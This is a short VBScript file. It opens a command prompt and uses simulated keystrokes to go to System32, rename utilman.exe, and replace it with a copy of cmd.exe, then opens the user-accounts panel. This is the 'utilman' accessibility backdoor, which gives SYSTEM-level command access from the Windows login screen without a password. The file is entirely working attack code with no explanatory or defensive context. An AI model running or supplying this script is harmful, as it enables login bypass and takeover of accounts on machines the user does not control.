Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 5000

' cmd 
WshShell.Run "cmd"
WScript.Sleep 1000

'commands
WshShell.SendKeys "c:" & "{ENTER}"
WScript.Sleep 500
WshShell.SendKeys "cd windows" & "{ENTER}"
WScript.Sleep 500
WshShell.SendKeys "cd system32" & "{ENTER}"
WScript.Sleep 500
WshShell.SendKeys "ren utilman.exe utilman1.exe" & "{ENTER}"
WScript.Sleep 500
WshShell.SendKeys "ren cmd.exe utilman.exe" & "{ENTER}"
WScript.Sleep 500
WshShell.SendKeys "control userpasswords2" & "{ENTER}"
